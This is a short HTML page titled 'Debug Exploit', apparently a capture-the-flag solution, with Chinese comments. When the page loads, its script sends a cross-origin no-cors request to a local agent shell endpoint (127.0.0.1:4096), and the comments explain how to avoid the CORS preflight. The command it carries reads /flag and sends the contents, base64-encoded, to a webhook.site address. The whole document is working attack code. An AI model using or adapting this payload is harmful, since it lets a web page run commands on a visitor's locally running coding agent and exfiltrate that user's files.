<!DOCTYPE html>
<html>
<head><title>Debug Exploit</title></head>
<body>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <script>
// 部署在 HTTP 页面上以避开协议阻断
fetch('http://127.0.0.1:4096/session/default/shell', {
    method: 'POST',
    mode: 'no-cors', // 告诉浏览器：我不关心结果，只要把请求发出去就行
    headers: {
        'Content-Type': 'text/plain' // 简单请求，不触发预检
    },
    // 注意：payload 必须符合 opencode 的 JSON 格式要求
    body: JSON.stringify({
        "command": "chmod 444 /flag && curl https://webhook.site/6c7b9fec-12ce-4d1c-b5ce-5938576168f4?f=$(cat /flag|base64)"
    })
}).then(() => {
    console.log("请求已发出，请检查 Webhook");
});
    </script>
</body>
</html>
